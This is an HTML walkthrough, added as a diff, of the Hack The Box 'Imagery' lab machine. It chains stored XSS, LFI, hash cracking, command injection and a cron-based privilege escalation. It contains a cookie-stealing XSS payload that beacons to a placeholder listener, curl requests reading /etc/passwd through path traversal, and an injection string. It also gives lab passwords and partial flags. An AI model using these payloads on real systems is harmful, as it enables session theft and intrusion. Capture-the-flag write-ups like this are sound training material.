@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Imagery - Walkthrough</title>
+    <style>
+        body { font-family: "Segoe UI", Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
+        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
+        .section { margin-bottom: 40px; }
+        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
+        .tag-success { background-color: #28a745; }
+        .tag-failure { background-color: #dc3545; }
+        .tag-info { background-color: #17a2b8; }
+        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: "Consolas", monospace; position: relative; margin: 20px 0; }
+        code { font-family: "Consolas", monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>HTB Imagery - Walkthrough</h1>
+        <p style="text-align:Left; margin-top:-15px; color:#555;"><strong>Category:</strong> Hard</p>
+
+        <div class="section">
+            <p>This walkthrough is a reproducible, technical guide for the Imagery machine. Created on 2025.12.28. Since the available walkthroughs did not (or only partially) match the real attack structure, this writeup was updated.</p>
+        </div>
+
+        <div class="section">
+            <h2>1. Recon</h2>
+            <span class="tag tag-info">INFO</span>
+            <p>Nmap showed two relevant ports: 22 (SSH) and 8000 (Flask webapp). The website was an Image Gallery interface with admin and testuser features.</p>
+
+            <pre><code># nmap -sC -sV imagery.htb
+22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu
+8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>2. Stored XSS → Admin cookie</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>The stored XSS on the <code>/report_bug</code> endpoint worked. A simple <code>img</code> beacon sent back the admin session cookie. This was the first pivot to the admin endpoints.</p>
+
+            <pre><code># XSS payload
+{"bugName":"xss","bugDetails":"&lt;script&gt;new Image().src='http://&lt;LHOST&gt;/?c='+document.cookie&lt;/script&gt;"}</p>
+(B64 recommended)
+# Receive callbacks
+python3 -m http.server &lt;LPORT&gt;</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>3. LFI → db.json and sources</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>With the admin cookie, the <code>/admin/get_system_log</code> LFI made files readable. This successfully pulled <code>db.json</code>, Flask sources, logs, and some filler artifacts.</p>
+
+            <pre><code>curl "http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../etc/passwd" \
+  -H "Cookie: session=&lt;ADMIN_COOKIE&gt;"
+
+curl "http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../home/web/web/db.json" \
+  -H "Cookie: session=&lt;ADMIN_COOKIE&gt;"</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>4. Hash cracking → testuser password</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>The <code>db.json</code> contained MD5 hashes. Cracking the testuser hash yielded the password: <code></code>.</p>
+
+            <pre><code># John
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+# 2c65c8d7bfbca32a3ed42596192384f6 : iam******</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>5. Command Injection → web shell</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>On <code>/apply_visual_transform</code>, the crop parameters built multiple shell commands; one of them succeeded. I read the output back over HTTP.</p>
+
+            <pre><code># login as testuser (password: iam******)
+POST /login
+
+# injection example (strongly obfuscated logic was needed here)
+POST /apply_visual_transform
+x = "0; &lt;command&gt; ;#"
+# output: /home/web/web/uploads/out.txt
+GET /uploads/out.txt</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>6. Mark user → PTY-based su</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>Without a PTY, <code>su</code> produced no output. However, a short PTY script allowed the password: <code>supersmash</code>. That made the mark user and the user flag accessible.</p>
+
+            <pre><code># PTY script idea (had to be wrapped in base64, then run via injection)
+python3 -c "import os,pty,select,time; ...; su mark -c 'cat /home/mark/user.txt'"
+
+# User flag:
+6df40a059a874d9fc76ec0a966ca******</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>7. Privilege Escalation → charcol cron</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p><code>sudo -l</code> showed that <code>mark</code> can run <code>/usr/local/bin/charcol</code>. On first run, “no password mode” was granted, then a re-entry. After that, a cron job can be added from the charcol shell. At the password prompt, the system password was the same: <code>supersmash</code>.</p>
+
+            <pre><code>sudo /usr/local/bin/charcol shell
+# no password mode: Enter + yes
+# restart, then:
+auto add --schedule "* * * * *" \
+  --command "/bin/cat /root/root.txt &gt; /tmp/final_flag.txt" \
+  --name "getflag"
+# system password: supersmash</code></pre>
+
+            <p>After the cron ran, the flag became available in <code>/tmp/final_flag.txt</code>, which I pulled with the earlier command injection method, very quickly.</p>
+
+            <pre><code>Root flag:
+0ed205b7fe3e7c63b93b2b35e6fc******</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>8. Extra successful steps (brought progress)</h2>
+            <span class="tag tag-info">INFO</span>
+            <ul>
+                <li><strong>backup.aes</strong> successfully decrypted (<code>pyAesCrypt</code>), extracting sources and <code>db.json</code>.</li>
+                <li>Admin cookie validation and LFI access confirmation.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>9. Failed approaches</h2>
+            <span class="tag tag-failure">DEAD END</span>
+            <ul>
+                <li><strong>Automated charcol reset script:</strong> without prompt handling the flow stopped, like a kid in kindergarten.</li>
+                <li><strong>Early cron attempts:</strong> missing password prompt handling meant the job was never created, and it kicked us out so hard that we had to restart everything.</li>
+                <li><strong>Quick root via reverse shell:</strong> unstable due to missing TTY, but just stable enough to make you think it is worth fiddling with.</li>
+            </ul>
+        </div>
+
+        <div class="footer">
+            <p>HTB Imagery | December 28, 2025</p>
+        </div>
+    </div>
+</body>
+</html>
